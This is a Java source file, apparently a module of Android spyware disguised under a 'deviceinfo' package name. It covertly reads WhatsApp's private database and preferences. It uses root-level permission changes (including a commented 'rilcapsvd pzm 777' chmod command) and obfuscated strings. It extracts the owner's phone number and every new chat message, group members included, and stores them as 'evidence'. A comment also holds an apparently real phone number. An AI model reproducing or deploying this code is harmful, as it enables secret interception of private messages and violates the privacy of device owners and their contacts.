package com.android.deviceinfo.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatWhatsapp extends SubModuleChat {
	private static final String TAG = "ChatWhatsapp";

	ChatGroups groups = new ChatWhatsappGroups();

	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
	private static final int PROGRAM = 0x06;

	private static final String DEFAULT_LOCAL_NUMBER = "local";
	String pObserving = "whatsapp";

	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}

		try {
			readChatWhatsappMessages();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		hastableConversationLastIndex = new Hashtable<String, Integer>();
		try {
			myPhoneNumber = readMyPhoneNumber();

			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
				enabled = false;
				return;
			}

			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);

			if (markup.isMarkup()) {
				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
				Enumeration<String> keys = hastableConversationLastIndex.keys();

				while (keys.hasMoreElements()) {
					String key = keys.nextElement();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), get all Chats");
				}

				readChatWhatsappMessages();
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), " + e);
			}
		}

	}

	private String readMyPhoneNumber() {
		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
		/*
		 * <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map>
		 * <string
		 * name="com.whatsapp.RegisterPhone.phone_number">3938980634</string>
		 * <int name="com.whatsapp.RegisterPhone.country_code_position"
		 * value="-1" /> <boolean name="com.whatsapp.RegisterPhone.no_self_send"
		 * value="false" /> <int
		 * name="com.whatsapp.RegisterPhone.verification_state" value="14" />
		 * <int name="com.whatsapp.RegisterPhone.phone_number_position"
		 * value="10" /> <string
		 * name="com.whatsapp.RegisterPhone.input_country_code">39</string>
		 * <string name="com.whatsapp.RegisterPhone.input_phone_number">393 898
		 * 0634</string> <string
		 * name="com.whatsapp.RegisterPhone.prev_country_code">39</string>
		 * <string name="com.whatsapp.RegisterPhone.country_code">39</string>
		 * <string
		 * name="com.whatsapp.RegisterPhone.prev_phone_number">3938980634
		 * </string> </map>
		 */

		String filename = M.d("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
		try {
			// f_2=/system/bin/rilcapsvd pzm 777
			Path.unprotect(filename, 2, true);
			// Runtime.getRuntime().exec(M.d("/system/bin/rilcapsvd pzm 777 ") +
			// filename);
			File file = new File(filename);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			// Element root = doc.getDocumentElement();
			// root.getElementsByTagName("string");

			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");
			for (int i = 0; i < stringNodes.getLength(); i++) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
				}
				// f_e=com.whatsapp.RegisterPhone.phone_number
				if (item != null && M.d("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
					}
					String myPhone = node.getFirstChild().getNodeValue();
					return myPhone;
				}
			}

		} catch (Exception e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		}

		return DEFAULT_LOCAL_NUMBER;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	/**
	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
	 * messaggi relativi
	 * 
	 * @throws IOException
	 */
	private void readChatWhatsappMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}
			return;
		}

		try {
			boolean updateMarkup = false;

			// f.0=/data/data/com.whatsapp/databases
			String dbDir = M.d("/data/data/com.whatsapp/databases");
			// f.1=/msgstore.db
			String dbFile = M.d("/msgstore.db");

			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				SQLiteDatabase db = helper.getReadableDatabase();

				// retrieve a list of all the conversation changed from the last
				// reading. Each conversation contains the peer and the last id
				ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);

				// for every conversation, fetch and save message and update
				// markup
				for (Pair<String, Integer> pair : changedConversations) {
					String conversation = pair.first;
					int lastReadIndex = pair.second;

					if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
						fetchGroup(db, conversation);
					}

					int newLastRead = fetchMessages(db, conversation, lastReadIndex);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
								+ " newLastRead " + newLastRead);
					}
					hastableConversationLastIndex.put(conversation, newLastRead);
					if (Cfg.DEBUG) {
						Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
								" (readChatMessages) Assert failed, zero index");
					}
					updateMarkup = true;
				}

				if (updateMarkup) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): updating markup");
					}
					markup.writeMarkupSerializable(hastableConversationLastIndex);
				}

				db.close();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private void fetchGroup(SQLiteDatabase db, final String conversation) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchGroup) : " + conversation);
		}

		// f.4=_id
		// f.5=key_remote_jid
		// f_f=remote_resources
		String[] projection = { M.d("_id"), M.d("remote_resource") };
		String selection = M.d("key_remote_jid") + "='" + conversation + "'";

		// final Set<String> remotes = new HashSet<String>();
		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String remote = cursor.getString(1);
				// remotes.add(remote);
				if (remote != null) {
					groups.addPeerToGroup(conversation, clean(remote));
				}
				return id;
			}
		};

		GenericSqliteHelper helper = new GenericSqliteHelper(db);
		// f_a = messages
		helper.traverseRecords(M.d("messages"), visitor);

	}

	/**
	 * Retrieves the list of the conversations and their last read message.
	 * 
	 * @param db
	 * @return
	 */
	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}

		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		// CREATE TABLE chat_list (_id INTEGER PRIMARY KEY AUTOINCREMENT,
		// key_remote_jid TEXT UNIQUE, message_table_id INTEGER)

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.3=chat_list
		queryBuilderIndex.setTables(M.d("chat_list"));
		// queryBuilder.appendWhere(inWhere);
		// f.4=_id
		// f.5=key_remote_jid
		// f.6=message_table_id
		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("message_table_id") };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.d("key_remote_jid")));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.d("message_table_id")));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation is known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		return changedConversations;
	}

	/**
	 * Fetch unread messages of a specific conversation
	 * 
	 * @param db
	 * @param conversation
	 * @param lastReadIndex
	 * @return
	 */
	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
		}
		// CREATE TABLE messages (_id INTEGER PRIMARY KEY AUTOINCREMENT,
		// key_remote_jid TEXT NOT NULL, key_from_me INTEGER, key_id TEXT NOT
		// NULL, status INTEGER, needs_push INTEGER, data TEXT, timestamp
		// INTEGER, media_url TEXT, media_mime_type TEXT, media_wa_type TEXT,
		// media_size INTEGER, media_name TEXT, media_hash TEXT, latitude REAL,
		// longitude REAL, thumb_image TEXT, remote_resource TEXT,
		// received_timestamp INTEGER, send_timestamp INTEGER,
		// receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER,
		// raw_data BLOB)

		String peer = clean(conversation);

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.a=messages
		queryBuilderIndex.setTables(M.d("messages"));
		// f.4=_id
		// f.5=key_remote_jid
		queryBuilderIndex.appendWhere(M.d("key_remote_jid") + " = '" + conversation + "' AND " + M.d("_id") + " > "
				+ lastReadIndex);
		// f.7=data
		// f_b=timestamp
		// f_c=key_from_me
		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("data"), M.d("timestamp"), M.d("key_from_me"),
				"remote_resource" };

		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
		// AND key_remote_jid>$lastReadIndex
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.d("_id"));

		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		int lastRead = lastReadIndex;
		while (cursor != null && cursor.moveToNext()) {
			int index = cursor.getInt(0); // f_4
			String message = cursor.getString(2); // f_7
			Long timestamp = cursor.getLong(3); // f_b

			boolean incoming = cursor.getInt(4) != 1; // f_c

			String remote = clean(cursor.getString(5));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
			}
			lastRead = Math.max(index, lastRead);

			if (StringUtils.isEmpty(message)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages), empty message");
				}
				continue;

			}

			if (Cfg.DEBUG) {
				// Check.log(TAG + " (fetchMessages): " +
				// StringUtils.byteArrayToHexString(message.getBytes()));
			}

			String from = incoming ? peer : myPhoneNumber;
			String to = incoming ? myPhoneNumber : peer;

			// if (groups.isGroup(peer)) {
			// to = groups.getGroupTo(from, peer);
			// }

			if (groups.isGroup(peer)) {
				if (incoming) {
					from = remote;
				} else {
					// to = groups.getGroupTo(from, peer);
				}
				to = groups.getGroupToName(from, peer);
			}

			if (to != null && from != null && message != null) {
				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages) Error, null values");
				}
			}

		}
		cursor.close();
		getModule().saveEvidence(messages);
		return lastRead;
	}

	private String clean(String remote) {
		if (remote == null) {
			return null;
		}
		// f_9=@s.whatsapp.net
		return remote.replaceAll(M.d("@s.whatsapp.net"), "");
	}

}
